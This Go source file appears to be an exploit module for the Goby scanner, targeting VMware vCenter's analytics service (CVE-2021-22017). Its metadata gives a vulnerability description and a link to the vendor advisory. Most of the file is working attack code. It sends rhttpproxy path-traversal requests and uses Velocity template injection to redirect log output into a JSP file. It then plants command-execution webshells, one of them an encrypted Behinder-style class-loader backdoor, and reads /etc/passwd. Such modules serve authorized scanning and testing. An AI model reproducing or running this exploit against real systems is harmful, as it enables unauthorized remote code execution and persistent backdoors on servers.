package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "VMware vCenter rce (CVE-2021-22017)",
    "Description": "<p>VMware vCenter Server is a set of server and virtualization management software from Vmware. The software provides a centralized platform for managing VMware vSphere environments, which can automatically implement and deliver virtual infrastructure.</p><p>Due to improper implementation of URI standardization, an rhttpproxy bypass vulnerability exists in VMware vCenter Server. Attackers can use this vulnerability to gain unauthorized access to some specific interfaces, and then use Velocity template engine to render malicious templates to modify log files, resulting in arbitrary code execution ( CVE-2021-22017).</p>",
    "Impact": "VMware vCenter rce (CVE-2021-22017)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0020.html\">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a></p>",
    "Product": "Vmware VCenter",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "VMware vCenter 远程命令执行漏洞 (CVE-2021-22017)",
            "Description": "<p>VMware vCenter Server是美国威睿（Vmware）公司的一套服务器和虚拟化管理软件。该软件提供了一个用于管理VMware vSphere环境的集中式平台，可自动实施和交付虚拟基础架构。</p><p>由于 URI 规范化实施不当 ，VMware vCenter Server 中存在 rhttpproxy 绕过漏洞，攻击者可以利用该漏洞未授权访问一些特定的接口，接着利用 Velocity 模板引擎渲染恶意模板来修改日志文件文件，进而导致任意代码执行（CVE-2021-22017）。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">由于 URI 规范化实施不当 ，VMware vCenter Server 中存在 rhttpproxy 绕过漏洞，攻击者可以利用该漏洞未授权访问一些特定的接口，接着利用 Velocity 模板引擎渲染恶意模板来修改日志文件文件，进而导致任意代码执行（CVE-2021-22017）。</span><br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0020.html\">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a><br></p>",
            "Product": "Vmware VCenter",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "VMware vCenter rce (CVE-2021-22017)",
            "Description": "<p>VMware vCenter Server is a set of server and virtualization management software from Vmware. The software provides a centralized platform for managing VMware vSphere environments, which can automatically implement and deliver virtual infrastructure.</p><p>Due to improper implementation of URI standardization, an rhttpproxy bypass vulnerability exists in VMware vCenter Server. Attackers can use this vulnerability to gain unauthorized access to some specific interfaces, and then use Velocity template engine to render malicious templates to modify log files, resulting in arbitrary code execution ( CVE-2021-22017).</p>",
            "Impact": "VMware vCenter rce (CVE-2021-22017)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0020.html\">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a><br></p>",
            "Product": "Vmware VCenter",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"content=\\\"VMware VirtualCenter\" || body=\"content=\\\"VMware vSphere\" || title=\"vSphere Web Client\" || banner=\"vSphere Management \" || cert=\"Issuer: cn=CA, dc=vsphere\" || body=\"url=vcops-vsphere/\" || body=\"The vShield Manager requires\" || title=\"ID_VC_Welcome\")",
    "GobyQuery": "(body=\"content=\\\"VMware VirtualCenter\" || body=\"content=\\\"VMware vSphere\" || title=\"vSphere Web Client\" || banner=\"vSphere Management \" || cert=\"Issuer: cn=CA, dc=vsphere\" || body=\"url=vcops-vsphere/\" || body=\"The vShield Manager requires\" || title=\"ID_VC_Welcome\")",
    "Author": "keeeee",
    "Homepage": "https://www.vmware.com/products/vcenter-server.html",
    "DisclosureDate": "2021-09-27",
    "References": [
        "https://kb.vmware.com/s/article/85717",
        "https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-22017"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202109-1479"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,GetShell,Behinder_webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        },
        {
            "name": "passwd",
            "type": "input",
            "value": "vulgo",
            "show": "AttackType=GetShell"
        },
        {
            "name": "password",
            "type": "input",
            "value": "rebeyond",
            "show": "AttackType=Behinder_webshell"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Vmware VCenter"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10229"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/analytics/telemetry/ph/api/hyper/send?_c&_i=test"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/json")
			cfg.Data = "test"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 201 {
					agentName := goutils.RandomHexString(5)
					payloadUrl := "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=" + agentName + "&_i=test2"
					cfg := httpclient.NewPostRequestConfig(payloadUrl)
					cfg.Header.Store("Content-Type", "application/json")
					cfg.Header.Store("Cache-Control", "max-age=0")
					cfg.Header.Store("Upgrade-Insecure-Requests", "1")
					cfg.Header.Store("X-Deployment-Secret", "abc")
					cfg.FollowRedirect = false
					cfg.Data = `{"manifestSpec":{},"objectType":"a2","collectionTriggerDataNeeded":true,"deploymentDataNeeded":true,"resultNeeded":true,"signalCollectionCompleted":true,"localManifestPath":"a7","localPayloadPath":"a8","localObfuscationMapPath":"a9"}`
					cfg.VerifyTls = false
					httpclient.DoHttpRequest(u, cfg)
					manifestData := `{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                     \n                        <forType>ServiceInstance</forType>\n                     <mappingCode><![CDATA[\n                        #set($a = $GLOBAL-logger)##]]>\n\n                     </mappingCode>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n   <requestSchedules>\n      <schedule interval=\"1h\">\n         <queries>\n            <query>vir:VCenter</query>\n         </queries>\n      </schedule>\n   </requestSchedules>\n</manifest>", "objectId": "a2"}`
					payloadUrl = "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=" + agentName + "&_i=test2"
					cfg = httpclient.NewPostRequestConfig(payloadUrl)
					cfg.Header.Store("Content-Type", "application/json")
					cfg.Header.Store("Cache-Control", "max-age=0")
					cfg.Header.Store("Upgrade-Insecure-Requests", "1")
					cfg.Header.Store("X-Deployment-Secret", "abc")
					cfg.FollowRedirect = false
					cfg.Data = manifestData
					cfg.VerifyTls = false
					if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp.StatusCode == 200 {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["AttackType"].(string)
			agentName := goutils.RandomHexString(5)
			payloadUrl := "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=" + agentName + "&_i=test2"
			cfg := httpclient.NewPostRequestConfig(payloadUrl)
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.Data = `{"manifestSpec":{},"objectType":"a2","collectionTriggerDataNeeded":true,"deploymentDataNeeded":true,"resultNeeded":true,"signalCollectionCompleted":true,"localManifestPath":"a7","localPayloadPath":"a8","localObfuscationMapPath":"a9"}`
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			webshell := goutils.RandomHexString(5)
			manifestData := `{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                     \n                        <forType>ServiceInstance</forType>\n                     <mappingCode><![CDATA[\n                        #set($a = $GLOBAL-logger)##\n                        $a.logger.parent.getAppender(\"LOGFILE\").setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp\")##\n                        $a.logger.parent.getAppender(\"LOGFILE\").activateOptions()##]]>\n\n                     </mappingCode>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n   <requestSchedules>\n      <schedule interval=\"1h\">\n         <queries>\n            <query>vir:VCenter</query>\n         </queries>\n      </schedule>\n   </requestSchedules>\n</manifest>", "objectId": "a2"}`
			payloadUrl = "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=" + agentName + "&_i=test2"
			cfg = httpclient.NewPostRequestConfig(payloadUrl)
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.Data = manifestData
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			cfg = httpclient.NewPostRequestConfig("/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=mtusf5&_i=test2")
			cfg.Data = `<% out.println("<999999999999999999999999999>");String[] c = {"/bin/bash","-c",request.getParameter("vulgo")};java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}out.println("<999999999999999999999999999/>");%>`
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			rawLog := "/var/log/vmware/analytics/analytics.log"
			manifestData4 := `{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                     \n                        <forType>ServiceInstance</forType>\n                     <mappingCode><![CDATA[\n                        #set($a = $GLOBAL-logger)##\n                        $a.logger.parent.getAppender(\"LOGFILE\").setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + rawLog + `\")##\n                        $a.logger.parent.getAppender(\"LOGFILE\").activateOptions()##]]>\n\n                     </mappingCode>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n   <requestSchedules>\n      <schedule interval=\"1h\">\n         <queries>\n            <query>vir:VCenter</query>\n         </queries>\n      </schedule>\n   </requestSchedules>\n</manifest>", "objectId": "a2"}`
			payloadUrl = "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=" + agentName + "&_i=test2"
			cfg = httpclient.NewPostRequestConfig(payloadUrl)
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.Data = manifestData4
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if attackType == "cmd" {
				cmd := ss.Params["cmd"].(string)
				cmd = cmd + ` && rm /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp`
				webshellUrl := `/idm/..;/` + webshell + `.jsp`
				cfg = httpclient.NewPostRequestConfig(webshellUrl)
				cfg.Data = `vulgo=` + url.QueryEscape(cmd)
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					reg := regexp.MustCompile(`(?s)<999999999999999999999999999>(.*)<999999999999999999999999999/>`)
					result := reg.FindStringSubmatch(resp.RawBody)
					if len(result) > 0 {
						expResult.Output = result[1]
						expResult.Success = true
					}
				}
			} else if attackType == "GetShell" {
				password := ss.Params["passwd"].(string)
				if len(password) == 0 {
					password = "vulgo"
				}
				webshellUrl := "/idm/..;/" + webshell + ".jsp"
				newWebshell := goutils.RandomHexString(5)
				newWebshellUrl := "/idm/..;/" + newWebshell + ".jsp"
				cfg = httpclient.NewPostRequestConfig(webshellUrl)
				webshellCode := `<% String[] c = {"/bin/bash","-c",request.getParameter("` + password + `")};java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>`
				webshellCode = base64.StdEncoding.EncodeToString([]byte(webshellCode))
				cmd := `echo ` + webshellCode + `| base64 -d | tee ` + `/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + newWebshell + `.jsp && rm /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp`
				cmd = url.QueryEscape(cmd)
				cfg.Data = `vulgo=` + cmd
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				cfg = httpclient.NewPostRequestConfig(newWebshellUrl)
				cfg.Data = password + `=cat+/etc/passwd`
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if regexp.MustCompile(`root:[x*]?:0:`).MatchString(resp.RawBody) {
						expResult.Output += "Webshell :" + expResult.HostInfo.FixedHostInfo + newWebshellUrl + "\n"
						expResult.Output += "Password :  " + password + "\n"
						expResult.Success = true
					}
				}
			} else if attackType == "Behinder_webshell" {
				password := ss.Params["password"].(string)
				if len(password) == 0 {
					password = "rebeyond"
				}
				hash := fmt.Sprintf("%x", md5.Sum([]byte(password)))
				key := hash[0:16]
				behinderWebshell := goutils.RandomHexString(5)
				webshellUrl := "/idm/..;/" + webshell + ".jsp"
				behinderWebshellUrl := "/idm/..;/" + behinderWebshell + ".jsp"
				cfg = httpclient.NewPostRequestConfig(webshellUrl)
				behinderWebshellCode := `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="` + key + `";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				behinderWebshellCode = base64.StdEncoding.EncodeToString([]byte(behinderWebshellCode))
				cmd := `echo ` + behinderWebshellCode + `| base64 -d | tee ` + `/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + behinderWebshell + `.jsp && rm /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp`
				cmd = url.QueryEscape(cmd)
				cfg.Data = `vulgo=` + cmd
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				cfg = httpclient.NewGetRequestConfig(behinderWebshellUrl)
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode != 404 {
						expResult.Output = expResult.HostInfo.FixedHostInfo + behinderWebshellUrl + "\n-----------Using Behinder_v3.0 to connect, the password is " + password
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
